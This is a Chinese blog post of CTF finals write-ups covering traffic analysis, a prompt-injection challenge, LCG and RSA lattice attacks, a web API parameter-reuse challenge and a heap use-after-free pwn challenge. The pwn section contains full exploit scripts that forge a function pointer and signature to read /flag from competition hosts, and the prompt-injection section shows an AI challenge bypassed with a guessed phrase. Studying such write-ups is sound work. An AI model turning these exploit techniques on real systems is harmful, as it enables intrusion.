---
title: "蓝桥杯决赛wp"
image: ''
pinned: false
comment: true
published: 2026-06-03
updated: 2026-06-03
description: "部分wp"
category: 学习
tags: [学习]
---

# pac![8570803823CDCAC36496CF556A525D67](/images/8570803823CDCAC36496CF556A525D67.png)ket_shift

流量分析。

用工具直接进行分析。

![{9878A767-D319-46FD-813E-03A405CD0792}](/images/{9878A767-D319-46FD-813E-03A405CD0792}.png)

udp流量，看sata和seq，除了我这个工具还可以直接wirseshark然后过滤udp，然后追踪流udp，就可以得到数据。

直接写代码进行提取，然后很明显的base64再加入base64解密。

```
import base64
import re
import subprocess

pcap_path = "challenge.pcap"
target_dev = "cam-a"


def main():
    out = subprocess.check_output(
        ["tshark", "-r", pcap_path, "-T", "fields", "-e", "udp.payload"],
        text=True,
    )
    frags = []
    for line in out.splitlines():
        if not line.strip():
            continue
        try: 
            msg = bytes.fromhex(line.strip()).decode()
        except Exception:
            continue
        if msg.startswith(f"FRAG dev={target_dev}"):
            seq = int(re.search(r"seq=(\d+)", msg).group(1))
            data = re.search(r"data=(\S+)", msg).group(1)
            frags.append((seq, data))
    merged = "".join(part for _, part in sorted(frags))
    print(base64.b64decode(merged).decode())


if __name__ == "__main__":
    main()

```

![{13162D12-D751-4069-BB7E-737CF26A6EA2}](/images/{13162D12-D751-4069-BB7E-737CF26A6EA2}.png)

**flag{ba3c5544-ad6b-8c6c-a85f-fcfa688ef2ca}**





# prompt_audit



这题我是非预期解。

![{B655A114-E157-451D-8628-350F2C37437D}](/images/{B655A114-E157-451D-8628-350F2C37437D}.png)

一开始我三个界面一个界面一个界面的。

![image-20260530163301028](/images/image-20260530163301028.png)

![image-20260530163307966](/images/image-20260530163307966.png)

![image-20260530163313207](/images/image-20260530163313207.png)

![image-20260530163322099](/images/image-20260530163322099.png)

将所有有可能有用的信息都拉出来后，突然发现一个flag字符串。

提交后发现是正确的，所以我就好奇是什么原因。

经过测试，发现。

![{43398617-7606-4642-91CE-96150A320A05}](/images/{43398617-7606-4642-91CE-96150A320A05}.png)

当输入：

```
artifact verification
```

这个的时候，就能直接得到flag。

至于为什么输入这个，是因为。

![image-20260530163522781](/images/image-20260530163522781.png)

这里的举例第二个就是。

这道题应该是提示词注入的题目，但是我没搞懂，就变成了非预期。

目测应该是什么+什么+什么+什么的结构，可能这个举例正好撞了。

**flag{8c6ca040-cc94-40a6-af3b-016d7f00d5a8}**



# tiny_lcg

![image-20260530163655806](/images/image-20260530163655806.png)

![image-20260530163701960](/images/image-20260530163701960.png)

根据个人笔记和脚本，目测为线性同余方程的高位爆破。



给出了线性同余生成器参数、连续若干次高位输出，一段异或后的十六进制字符串。

已知：LCG 状态高 16 位的 6 个连续值。

可以枚举低 15 位 来恢复 完整 `seed`。

用 `seed` 就可以生成更长的 LCG 序列。

提取每个 bit 16–23 作为密钥字节，也就是高 8 位中的最低一个字节。

从第 7 个密钥字节开始，与密文 XOR → 得到明文。



```
modulus = 1 << 31
a = 1103515245
c = 12345
observed_high16 = ['32c4', '0fae', '4847', 'a861', '5e65', '3cbb']
encrypted_text = "f2a33c617cc9c9a3078ff1f6722b417408e776d786d71dee91d5fd0de46178129a4acd550eb248e40d17"

observed = [int(x, 16) for x in observed_high16]
seed = None
for low in range(1 << 15):
    state = (observed[0] << 15) | low
    cur = state
    ok = True
    for value in observed[1:]:
        cur = (a * cur + c) % modulus
        if cur >> 15 != value:
            ok = False
            break
    if ok:
        seed = state
        break

if seed is None:
    raise SystemExit("seed not found")

enc = bytes.fromhex(encrypted_text)
states = []
cur = seed
for _ in range(len(enc) + 8):
    states.append(cur)
    cur = (a * cur + c) % modulus

keystream = bytes((s >> 16) & 0xFF for s in states)
plain = bytes(x ^ y for x, y in zip(enc, keystream[6:]))
print(plain.decode())

```

![{5D394812-7C61-4F36-A5A4-7296240FA200}](/images/{5D394812-7C61-4F36-A5A4-7296240FA200}.png)

**flag{042df1ec-7fc9-4e59-b165-0b74d4e4a004}**





# lattice_receipt

![image-20260530164300759](/images/image-20260530164300759.png)

![image-20260530164313190](/images/image-20260530164313190.png)

![image-20260530164318652](/images/image-20260530164318652.png)

一组 RSA 参数，一个二次表达式。

RSA 一般情况下靠分解 n 破解，但这里 n 很大，无法直接分解。

本来想着直接使用费马分解法的，但发现：

但题目给了额外的信息：

存在一个较小的未知数 x（256 位），使得：
$$
ax^
2
 +bx+c_
0

 ≡0(mod(n))
$$
也就是说：
$$
ax^ 
2
 +bx+c_ 
0

 =k⋅n
$$
其中 k 是某个整数。

如果能够找到这个 x ，便可以得到 n 的一个因子，便可以分解 n。

设多项式：
$$
f(y) = ay^2 + by + c_0
$$

$$
f(x) \equiv 0 \pmod{n}
$$
令：
$$
y=xX
$$
所以：
$$
y<X^2
$$
且：
$$
f(y) \equiv 0 \pmod{n}
$$
最终目的为：

找到一个整系数多项式 h(y) ，满足 h(y0)=0 在整数上成立，其中：
$$
y_0 = xX
$$
取参数 m,t*m*,*t*（循环尝试），构造以下多项式集合：
$$
g_{i,j}(y) = y^j \cdot n^{m-i} \cdot f(y)^i, \quad i = 0..m, \ j = 0,1
$$

$$
g_i(y) = y^i \cdot f(y)^m, \quad i = 0..t
$$

通过 LLL 算法可以得到短向量，恢复根。



```
from fpylll import IntegerMatrix, LLL
from math import gcd
import sympy as sp

n = int("422432255985666345175707878873003038880241656708576300391089572030365205385428773309944317112051730239661981299388069910214920159986890067009480148855875638533320996777051780031673934924775771235557032528663682106763463547247841724869996146393953643586330168374560207238777767562259451798630901150576176560042687262325672918008625272402037391080937589800032668748843954022622603841293022354297257102770775150935075070631385820897581557808436331191610366147254938105734984672741870481817476257597156085158682687495816982889298415057106134213108119873315428982799563183372828598446439392086043885895326237981723702435283453039006712333277231452527292548376380985675075729226782604794053840332602703076061815494976692659731112372142178157498885770461378868896590762819980632504850686472824151204921686440370963655919274823419651367865872693815227049667019757771916607260143050939021465284930540531372945425362238522719106419073035308713169125862703455379722967678393317040786535883203323681789612997023877990022762284900433425629650420094041249718400112232573221987347529011714338019472847516214132296612673381023293719915087117276306986746216348523997813526245644825627628604548413995500400450405914029227879987921544551694832638659027")
e = int("65537")
c = int("60898888462232256438527165809348433953419615323658584021775304587730495581389649761467973374572324340495374563109625332727734614150223818939286445850593269440821976874087327693623615976457874624674481247562751192246610156294752407807223206045105461805779571368267815364349769402361822623113201163933690727431310504215595140463620652480091997615055829603964921905380600066005190124206939365500957253702820812362821889263771697609776267383574233391438376506145616262935719074774982490473120910273172129087739306494722462739673078535815974625326956757309598306358238968224697337600606933356767536112749436335852245811384324832773253586590918557008021527646332062632678953499883066707051649064637783250128778056935354040884306355180060335528665002362523835217055672730624530684853120147879929605059296436109364765234570660497605798121489643104413530218617371726280935140677168179474289559912439473040210111655000776757200119853259167361318481644890534915161020602029431728086082931415369206881786302094125479749148981533395163553230715578200070598698753664986038662024679944160167967210051288074717072626353604652374226640328469622357177954478250964611332163117786071611940965409202117155875845836427903173062205560276501231771133856077")
a = int("29071680978624438902623659006153741278563223284523241815922958622882978164833227089951887416355354209342128902329797948981227884227555083297781826884629045500717196846170903767641856660949705627355338625952338074736342482331373997692892596259857441680060220300665838136545316460809436592417980502838428012513455352902149371522828021523699228818184760670656674902188002921667329252832676003894331358263700705116787423671972622267556353199556402780397489286988346404579166100198125555889200617088843506845546056485286730668239343423264727761869030185489131682544227691247103449683378698898090197160760543789986772369597")
b = int("18531760294708772531236774336215416431580845679627099835550723887544516213656630257215679141762522841243633575620189769209216451496627046917377549884714688492831624650508270532324005793139437276722093215647970841134610911025306173210951346493060595753150155449131273514479525731819531617906167256000327926014707437856849547090922637019460692096942804659787869274563074251633709565369599185952902357727537384108758293691460766388597323482218175751476578932448806754463193915041560528845140520139772983516538361902802132145590956564550861041826375007874116160492689670342165374981533215631515398271180372269082710159857")
c_coeff = int("-370103082211399448643149445180794180887161464123813839818791896099210047226174849214440800868426511549395220264536653468709454879535385435745751339008960104169978346541283572360065171041995633563013693450470394284675805344869487594620148620261257283577219624306696704892061202397361361554004692328558117738295090759702436680012420520856077589384854707159396432274681001363336675048289432273719997058863351649161157850512395309085304620199304759501368602066880195241400110272096057055877040137745441251036451767029566381379408494183838399493046294419127070905127665848222661564667091896334501489387757688024520961005273563977738202283956988445113108873310143633731142970862057230294539256114534168240628540685229453726417585619469193676278380019947612041872788829303229359")
x_bits = int("256")

x = sp.symbols("x")
X = 1 << x_bits
a_1 = pow(a, -1, n)
b1 = (b * a_1) % n
c1 = (c_coeff * a_1) % n
if b1 > n // 2:
    b1 -= n
if c1 > n // 2:
    c1 -= n
f = sp.Poly(x**2 + b1 * x + c1, x, domain=sp.ZZ)

root_x = None
for m in range(1, 7):
    for t in range(0, 7):
        polys = []
        for i in range(m + 1):
            for j in range(2):
                polys.append((x * X) ** j * (n ** (m - i)) * (f.as_expr().subs(x, x * X) ** i))
        for i in range(t + 1):
            polys.append((x * X) ** i * (f.as_expr().subs(x, x * X) ** m))
        max_deg = max(sp.Poly(p, x).degree() for p in polys)
        mat = IntegerMatrix(len(polys), max_deg + 1)
        for i, p in enumerate(polys):
            poly = sp.Poly(sp.expand(p), x, domain=sp.ZZ)
            for j in range(max_deg + 1):
                mat[i, j] = int(poly.nth(j))
        LLL.reduction(mat)
        for ridx in range(mat.nrows):
            expr = sum(sp.Integer(int(mat[ridx, j])) * x**j / sp.Integer(X**j) for j in range(mat.ncols))
            num = sp.together(expr).as_numer_denom()[0]
            roots = sp.Poly(num, x, domain=sp.ZZ).ground_roots()
            for r in roots:
                rv = int(r)
                if 0 <= rv < X:
                    p = a * rv * rv + b * rv + c_coeff
                    g = gcd(n, p)
                    if 1 < g < n:
                        root_x = rv
                        break
            if root_x is not None:
                break
        if root_x is not None:
            break
    if root_x is not None:
        break

if root_x is None:
    raise SystemExit("root not found")

p = a * root_x * root_x + b * root_x + c_coeff
q = n // p
d = pow(e, -1, (p - 1) * (q - 1))
m = pow(c, d, n)
print(m.to_bytes((m.bit_length() + 7) // 8, "big").decode())

```

**flag{f9ab58c1db90ca755d59b02aff85c424}**



# mirror_index

![{A181E801-E443-4F39-BC79-9D89FFB8B1E4}](/images/{A181E801-E443-4F39-BC79-9D89FFB8B1E4}.png)

网页直接ctrl+u，看源码，发现提示：
查看提示：
![image-20260530171457294](/images/image-20260530171457294.png)

`mirror` 指向下一个要请求的归档文件路径。

![{6FD2F164-E427-4950-A34C-0E2FECA06EA9}](/images/{6FD2F164-E427-4950-A34C-0E2FECA06EA9}.png)

使用 `sample` 中的 `path`、`ts`、`sig` 作为参数：

```
GET /api/v1/internal/export?ts=20260530&sig=998528b05cfd2246
```

得到flag。

```
import requests

base_url = "https://eci-2ze4vsw3ats8347h9mpk.cloudeci1.ichunqiu.com:8000/"
build_index_path = "/static/build-index.json"


def main():
    session = requests.Session()
    session.verify = False
    build = session.get(base_url + build_index_path, timeout=10).json()
    archive = session.get(base_url + build["mirror"], timeout=10).json()
    sample = archive["sample"]
    r = session.get(
        base_url + sample["path"],
        params={"ts": sample["ts"], "sig": sample["sig"]},
        timeout=10,
    )
    print(r.json()["flag"])


if __name__ == "__main__":
    main()

```

**flag{39f16afc-d625-412f-8b20-24484414072b}**





# menu_keeper

uaf。

![{B61689E8-3407-42B7-9C3B-F70FF903B024}](/images/{B61689E8-3407-42B7-9C3B-F70FF903B024}.png)

`create_note()` 会创建：

```
cNote size = 0x28
note->size = 0x58
note->content = malloc(0x58)
note->preview = normal_preview
```



而`delete_note_content()` 只做了：

```
free(note->content);
```

![{2E6A2C1D-B813-40FD-B3F3-D17F3367186A}](/images/{2E6A2C1D-B813-40FD-B3F3-D17F3367186A}.png)



所以 `note->content` 仍然指向已经释放的 0x58 chunk。



随后 `create_action()` 会：

![{5DD6C555-56E2-4C66-916D-D3984A046A90}](/images/{5DD6C555-56E2-4C66-916D-D3984A046A90}.png)

```
action = malloc(0x58);
```

因为大小刚好一致，glibc 把刚刚释放的 `note->content` chunk 分配给 `action`。于是：

```
note->content == action
```

完成了action的任意写。



```
Action` 大小是 `0x58
```

![{5DD6C555-56E2-4C66-916D-D3984A046A90}](/images/{5DD6C555-56E2-4C66-916D-D3984A046A90}.png)

根据分析，大致结构为：

```
cstruct Action {
    Header h;                 // +0x00
    char name[0x18];          // +0x10
    uint64_t guard;           // +0x28
    uint64_t encoded_handler; // +0x30
    char arg[0x18];           // +0x38
    uint64_t sig;             // +0x50
};
encoded_handler = guard ^ normal_handler;
```

运行时：

```
chandler = action->encoded_handler ^ action->guard;
handler(action + 0x38);
```

只要知道 `guard`，就可以伪造函数指针。



![{11659C8D-0089-4C36-BE1F-728E13892835}](/images/{11659C8D-0089-4C36-BE1F-728E13892835}.png)

`show_note_content()` ：

```
note->preview(note->content, note->size);
```

此时 `note->content` 已经等于 `action`，而 `note->preview` 仍然是 `normal_preview`。



`normal_preview()` 会按字节打印十六进制：

![image-20260530173525093](/images/image-20260530173525093.png)

所以可以拿到完整的action对象。



## 

`run_action()` 有三层校验：



第一层是header：

```
check_header(action, ACTN)
```



第二层是 guard：

```
action->guard == expected_guard(action)
```



第三层是签名：

```
action->sig == expected_sig(action)
```



签名算法：

```
sig = 0x41554449545F5347 ^ guard ^ fnv1a64(action->arg, 0x18)
```



把 `arg` 改成 `/flag\x00` 后，重新计算 `sig`：

```
pythonpath_p = b"/flag\x00".ljust(0x18, b"\x00")
sig = 0x41554449545F5347 ^ guard ^ a64(path_p)
```

所以签名也能过。



最后把：

```
cencoded_handler = guard ^ audit_export;
arg = "/flag";
```

写回 action 对象。`run_action()` 解码后实际调用：

```
audit_export("/flag");
```

`audit_export()` 会 orw，所以得到flag。



![image-20260530173749153](/images/image-20260530173749153.png)

由于当时比赛场地的网络波动很大，没有采取nc直接连，而是socket连接。



```
import re
import socket
import struct

path = b"/flag\x00"


def recvuntil(sock, token):
    data = b""
    while token not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def send(sock, data):
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data + b"\n")


def a64(data):
    h = 0x14650FB0739D0383
    for b in data:
        h ^= b
        h = (h * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    return h


sock = socket.create_connection(("39.106.48.123", 32201))

recvuntil(sock, b"> ")
send(sock, "1")
recvuntil(sock, b"> ")
send(sock, "2")
recvuntil(sock, b"> ")
send(sock, "5")
recvuntil(sock, b"action name:\n")
send(sock, "A")
recvuntil(sock, b"> ")
send(sock, "4")

leak_menu = recvuntil(sock, b"> ")
leak_hex = re.search(rb"leak:([0-9a-f]+)\n", leak_menu).group(1)
leak = bytearray.fromhex(leak_hex.decode())

guard = struct.unpack("<Q", leak[0x28:0x30])[0]
normal_handler = struct.unpack("<Q", leak[0x30:0x38])[0] ^ guard
audit_export = normal_handler + 0x2B
path_p = path.ljust(0x18, b"\x00")

leak[0x30:0x38] = struct.pack("<Q", guard ^ audit_export)
leak[0x38:0x50] = path_p
sig = 0x41554449545F5347 ^ guard ^ a64(path_p)
leak[0x50:0x58] = struct.pack("<Q", sig)

send(sock, "3")
recvuntil(sock, b"send 88 bytes:\n")
sock.sendall(leak)
recvuntil(sock, b"> ")
send(sock, "6")
result = recvuntil(sock, b"> ")
start = result.index(b"flag{")
end = result.index(b"}", start) + 1
print(result[start:end].decode())

```

**flag{42afbf8c-c659-43d6-bc52-b1472048aa20}**



这是后续编写的通常脚本：

```
import re
import struct
from pwn import *

path = b"/flag\x00"


def a64(data):
    h = 0x14650FB0739D0383
    for b in data:
        h ^= b
        h = (h * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    return h


io = remote("8.147.132.32", 13440)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"5")
io.sendlineafter(b"action name:\n", b"A")
io.sendlineafter(b"> ", b"4")

leak_menu = io.recvuntil(b"> ")
leak_hex = re.search(rb"leak:([0-9a-f]+)\n", leak_menu).group(1)
leak = bytearray.fromhex(leak_hex.decode())

guard = struct.unpack("<Q", leak[0x28:0x30])[0]
normal_handler = struct.unpack("<Q", leak[0x30:0x38])[0] ^ guard
audit_export = normal_handler + 0x2B
path_p = path.ljust(0x18, b"\x00")

leak[0x30:0x38] = struct.pack("<Q", guard ^ audit_export)
leak[0x38:0x50] = path_p
sig = 0x41554449545F5347 ^ guard ^ a64(path_p)
leak[0x50:0x58] = struct.pack("<Q", sig)

io.sendline(b"3")
io.recvuntil(b"send 88 bytes:\n")
io.send(leak)
io.recvuntil(b"> ")
io.sendline(b"6")
result = io.recvuntil(b"> ")
start = result.index(b"flag{")
end = result.index(b"}", start) + 1
print(result[start:end].decode())

```





# 小总结：

理论上说，自己应该是有机会再出两题的，但是技术力不够，止步于此了。

一题cypto的密码靶机题，只要看懂前端底部的源码就秒杀了。

然后就是misc的第二题，我不会压缩，不过听跟我一起去的学长说，这题也不难，路径题。

对了。

展示一下，当时的神题。

![635F24E50630E1B2D50364E8C9114218](/images/635F24E50630E1B2D50364E8C9114218.png)

![QQ20260603-181341](/images/QQ20260603-181341.png)

![599e9046b48216c89656b3d166eb23b4](/images/599e9046b48216c89656b3d166eb23b4.png)

两题web，一题神秘数据库。

感觉不是我这个档次能做的。



---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
